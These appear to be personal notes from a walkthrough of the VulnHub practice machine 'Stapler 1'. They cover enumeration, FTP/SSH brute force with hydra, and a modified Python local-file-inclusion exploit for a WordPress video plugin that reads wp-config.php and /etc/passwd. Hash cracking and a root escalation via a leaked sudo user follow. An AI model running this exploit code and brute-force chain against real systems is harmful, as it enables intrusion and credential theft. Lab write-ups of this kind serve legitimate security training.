Walkthrough: https://www.sevenlayers.com/index.php/93-vulnhub-stapler-1-walkthrough

Usernames :
```
dave
abby
harry
elly
john
barry
kathy
fred
scott
pam
tim
zoe
vicki
peter
heather
garry
harry
scott
```

---

Nmap ports
```
21/tcp   open   ftp
22/tcp   open   ssh
53/tcp   open   domain
80/tcp   open   http
139/tcp  open   netbios-ssn
666/tcp  open   doom
3306/tcp open   mysql
```

```
21/tcp    open   ftp         vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Logged in as ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)

22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)

80/tcp    open   http        PHP cli server 5.5 or later

12380/tcp open   ssl/unknown
| ssl-cert: Subject: commonName=Red.Initech/organizationName=Initech/stateOrProvinceName=Somewhere in the middle of nowhere/countryName=UK
```

UDP ports:
```
69/udp    open          tftp        Netkit tftpd or atftpd
137/udp   open          netbios-ns  Samba nmbd netbios-ns (workgroup: WORKGROUP)
```

OpenSSL version:
```bash
openssl -v s_client -connect 192.168.185.148:12380
# OpenSSL 3.5.0 8 Apr 2025 (Library: OpenSSL 3.5.0 8 Apr 2025)
```

Directory brute:
```bash
gobuster dir -u http://192.168.185.148/ -w /usr/share/wordlists/dirb/common.txt -o gobuster_dir_common.txt -f

# /.bashrc/             (Status: 200) [Size: 3771]
# /.profile/            (Status: 200) [Size: 675]
```
=> Looks like its a home folder
=> Nothing interesting?

Exploits
```bash
searchsploit OpenSSH 7.2
# OpenSSH 7.2p2 - Username Enumeration     | linux/remote/40136.py
```
=> doesnt work with my python version


```bash
openssl s_client -connect 192.168.185.148:12380
```
Result:
```
emailAddress=pam@red.localhost

GET / HTTP/1.1
Host: Intech

HTTP/1.1 200 OK
Date: Thu, 22 May 2025 21:39:42 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Sat, 04 Jun 2016 23:37:47 GMT
ETag: "15-5347c53a972d1"
Accept-Ranges: bytes
Content-Length: 21
Dave: Soemthing doesn't look right here
Content-Type: text/html

Internal Index Page!
closed

```
=> WTF??
=> User: Dave, pam

Dir enum:
```bash
gobuster dir -k -u https://192.168.185.148:12380 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -o gobuster_p12380_dir_raft_s.txt -f
```

```
/phpmyadmin/          (Status: 200) [Size: 10339]
/announcements/       (Status: 200) [Size: 961]
```

/announcements/message.txt
```
Abby, we need to link the folder somewhere! Hidden at the mo
```
=> Username: Abby

```bash
ftp 192.168.185.148

# Banner:
# Harry, make sure to update the banner when you get a chance to show who has access here
```
=> Username: Harry
=> ftp `anonymous` with empty password is allowed
=> File `note`:
```
Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
```
=> Usernames: Elly, John

```bash
ssh 192.168.185.148
# Banner:
# Barry, don't forget to put a message here
```
=> Username: Barry

Brute force elly FTP password:
```bash
hydra -I -l elly -P /usr/share/wordlists/rockyou.txt 192.168.185.148 ftp
```

SMB enum
```bash
smbclient -N -L \\\\192.168.185.148\\

# Sharename       Type      Comment
# ---------       ----      -------
# print$          Disk      Printer Drivers
# kathy           Disk      Fred, What are we doing here?
# tmp             Disk      All temporary files should be stored here
# IPC$            IPC       IPC Service (red server (Samba, Ubuntu))

# Workgroup            Master
# ---------            -------
# WORKGROUP            RED
```
=> Usernames: kathy, Fred

```bash
smbclient -N \\\\192.168.185.148\\kathy

# Dirs:
# kathy_stuff
# backup

# Files:
# kathy_stuff/todo-list.txt
# backup/vsftpd.conf
# backup/wordpress-4.tar.gz
```
=> no interesting content in files

port 666
```bash
nc -nv 192.168.185.148 666
# => binary content

nc -nv 192.168.185.148 666 > what
# => pipe into file

file what
# what: Zip archive dat

7z x what
# message2.jpg
```
=> Username in message2.jpg: Scott

Metadata?
```bash
exiftool message2.jpg

# Contact  : If you are reading this, you should get a cookie!
```

If we input some bad characters and the server responds with 400 bad request we get a website
```
https://192.168.185.148:12380/$%&/()

# A message from the head of our HR department, Zoe, if you are looking at this, we want to hire you
```
=> usernames: tim, zoe

gobuster with dirb common.txt found:
```
https://red:12380/robots.txt

User-agent: *
Disallow: /admin112233/
Disallow: /blogblog/
```
=> admin112233 is troll
=> blogblog is a wordpress site
=> one block entry has username: Vicki
=> john 2nd name: smith

wpscan:
```bash
wpscan --disable-tls-checks --url https://red:12380/blogblog/ -e --plugins-detection aggressive -o wpscan

# WordPress version 4.2.1

# /blogblog/xmlrpc.php
# /blogblog/wp-content/uploads/
# /blogblog/wp-cron.php

wpscan --disable-tls-checks --url https://10.0.0.26:12380/blogblog/ -e ap --plugins-detection aggressive p12380_blogblo_wpscan.txt

# Plugins
# advanced-video-embed-embed-videos-or-playlists - Version: 1.0
# akismet
# shortcode-ui - Version: 0.6.2
# two-factor
```
=> more users: peter, heather, garry, harry, scott

Search WP plugin exploits:
```bash
searchsploit Advanced video
# WordPress Plugin Advanced Video 1.0 - Local File Inclusion                      | php/webapps/39646.py

searchsploit akismet
# 2 XSS

searchsploit shortcode
# WordPress Plugin ShortCode 0.2.3 - Local File Inclusion | php/webapps/34436.txt

searchsploit two-factor
# nothing
```

Modified pyhton3 Exploit 39646 https://gist.github.com/kongwenbin/8e89f553641bd76b1ee4bb93460fbb2c
```python
import random
import requests
import re

url = "https://10.0.0.26:12380/blogblog/"  # Insert the URL to your WordPress site

randomID = int(random.random() * 100000000000000000)

# Make the first request
response1 = requests.get(f"{url}/wp-admin/admin-ajax.php?action=ave_publishPost&title={randomID}&short=rnd&term=rnd&thumb=../wp-config.php", verify=False)
content1 = response1.text.splitlines()
print(content1)

for line in content1:
    numbers = re.findall(r'\d+', line)
    id = numbers[-1]
    id = int(id) // 10

# Make the second request
response2 = requests.get(f"{url}/?p={id}", verify=False)
content2 = response2.text.splitlines()

for line in content2:
    if 'attachment-post-thumbnail size-post-thumbnail wp-post-image' in line:
        urls = re.findall('"(https?://.*?)"', line)
        if len(urls):
            image_content = requests.get(urls[0], verify=False).content
            print(image_content.decode('utf-8'))
```

The exploit uploads files here:
```
https://10.0.0.26:12380/blogblog/wp-content/uploads/
```

Download and decode the file:
```bash
wget --no-check-certificate https://10.0.0.26:12380/blogblog/wp-content/uploads/1763436127.jpeg

iconv -t UTF8 1763436127.jpeg 
```
=> wp-config file
=>Creds:
```
# MySQL
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'plbkac');

# Authentication Unique Keys and Salts.
define('AUTH_KEY',         'V 5p=[.Vds8~SX;>t)++Tt57U6{Xe`T|oW^eQ!mHr }]>9RX07W<sZ,I~`6Y5-T:');
define('SECURE_AUTH_KEY',  'vJZq=p.Ug,]:<-P#A|k-+:;JzV8*pZ|K/U*J][Nyvs+}&!/#>4#K7eFP5-av`n)2');
define('LOGGED_IN_KEY',    'ql-Vfg[?v6{ZR*+O)|Hf OpPWYfKX0Jmpl8zU<cr.wm?|jqZH:YMv;zu@tM7P:4o');
define('NONCE_KEY',        'j|V8J.~n}R2,mlU%?C8o2[~6Vo1{Gt+4mykbYH;HDAIj9TE?QQI!VW]]D`3i73xO');
define('AUTH_SALT',        'I{gDlDs`Z@.+/AdyzYw4%+<WsO-LDBHT}>}!||Xrf@1E6jJNV={p1?yMKYec*OI$');
define('SECURE_AUTH_SALT', '.HJmx^zb];5P}hM-uJ%^+9=0SBQEh[[*>#z+p>nVi10`XOUq (Zml~op3SG4OG_D');
define('LOGGED_IN_SALT',   '[Zz!)%R7/w37+:9L#.=hL:cyeMM2kTx&_nP4{D}n=y=FQt%zJw>c[a+;ppCzIkt;');
define('NONCE_SALT',       'tb(}BfgB7l!rhDVm{eK6^MSN-|o]S]]axl4TE_y+Fi5I-RxN/9xeTsK]#ga_9:hJ');
```

Read etc passwd with modified exploit line
```python
response1 = requests.get(f"{url}/wp-admin/admin-ajax.php?action=ave_publishPost&title=etcpasswd{randomID}&short=rnd&term=rnd&thumb=../../../../../../../../../../../../../../../../../../../../../etc/passwd", verify=False)
```

Extract all users from etc passwd:
```bash
awk -F: '$3 >= 1000 {print $1}' etc_passwd > users.txt
```

Brute force FTP:
```bash
hydra -I -e nsr -L users.txt 10.0.0.26 ftp

# [21][ftp] host: 10.0.0.26   login: SHayslett   password: SHayslett
# [21][ftp] host: 10.0.0.26   login: elly   password: ylle
```
=> elly and SHayslett FTP root are both mapped to /etc ?

Brute force SSH:
```bash
hydra -I -e nsr -L users.txt 10.0.0.26 ssh

# [22][ssh] host: 10.0.0.26   login: SHayslett   password: SHayslett
```

SSH login as SHayslett:
```bash
ssh SHayslett@10.0.0.26
# PW: SHayslett
```

MYSQL
```bash
mysql -h 10.0.0.26 --user=root -p --skip-ssl
# PW: plbkac
```

```
use wordpress;
select * from wp_users;
select user_login, user_nicename, user_pass from wp_users;
+------------+---------------+------------------------------------+
| user_login | user_nicename | user_pass                          |
+------------+---------------+------------------------------------+
| John       | john          | $P$B7889EMq/erHIuZapMB8GEizebcIy9. |
| Elly       | elly          | $P$BlumbJRRBit7y50Y17.UPJ/xEgv4my0 |
| Peter      | peter         | $P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0 |
| barry      | barry         | $P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0 |
| heather    | heather       | $P$Bwd0VpK8hX4aN.rZ14WDdhEIGeJgf10 |
| garry      | garry         | $P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1 |
| harry      | harry         | $P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0 |
| scott      | scott         | $P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1 |
| kathy      | kathy         | $P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0 |
| tim        | tim           | $P$BXDR7dLIJczwfuExJdpQqRsNf.9ueN0 |
| ZOE        | zoe           | $P$B.gMMKRP11QOdT5m1s9mstAUEDjagu1 |
| Dave       | dave          | $P$Bl7/V9Lqvu37jJT.6t4KWmY.v907Hy. |
| Simon      | simon         | $P$BLxdiNNRP008kOQ.jE44CjSK/7tEcz0 |
| Abby       | abby          | $P$ByZg5mTBpKiLZ5KxhhRe/uqR.48ofs. |
| Vicki      | vicki         | $P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131 |
| Pam        | pam           | $P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0 |
+------------+---------------+------------------------------------+
```
=> Hashidentifier: MD5(Wordpress) 

Extract hashes to file:
```bash
mysql -h 10.0.0.26 --user=root -p --skip-ssl -B -e "use wordpress; SELECT user_pass FROM wp_users" > hashes.md5
```

Crack hashes:
```bash
hashcat -m 400 hashes.md5 /usr/share/wordlists/rockyou.txt

# $P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1:football               
# $P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1:cookie                 
# $P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0:monkey                 
# $P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0:coolgirl
```
=> are these newlines at the end of some passwords part of the pw?
garry:football
scott:cookie
harry:monkey
kathy:coolgirl

These creds can be used to login in WP:
```
https://10.0.0.26:12380/blogblog/wp-admin/
```

# PrivEsc

No sudo privs

```bash
uname -a

# Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 athlon i686 GNU/Linux
```

Distro:
```bash
cat /etc/*-release

# DISTRIB_ID=Ubuntu
# DISTRIB_RELEASE=16.04
# DISTRIB_CODENAME=xenial
```

Linux version:
```bash
cat /proc/version

# Linux version 4.4.0-21-generic (buildd@lgw01-06) (gcc version 5.3.1 20160413 (Ubuntu 5.3.1-14ubuntu2) ) #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016
```

Arch:
```bash
lscpu

# Architecture:          i686
# CPU op-mode(s):        32-bit
```

Search OS exploits:
```bash
searchsploit Ubuntu 16.04
# Some exploits available
```

linpeas:
```
=> dirty cow exploit highly likely

Write permission on cron script:
/usr/local/sbin/cron-logrotate.sh
```

```
Searching passwords in history files
/home/JKanode/.bash_history:sshpass -p thisimypassword ssh JKanode@localhost   # /home/JKanode/.bash_history:sshpass -p JZQuyIN5 peter@localhost
```

ssh login as peter:
```bash
ssh peter@10.0.0.26
# PW: JZQuyIN5

sudo -l
# User peter may run the following commands on red:
#    (ALL : ALL) ALL

sudo su

whoami
# root
```
BINGO!!!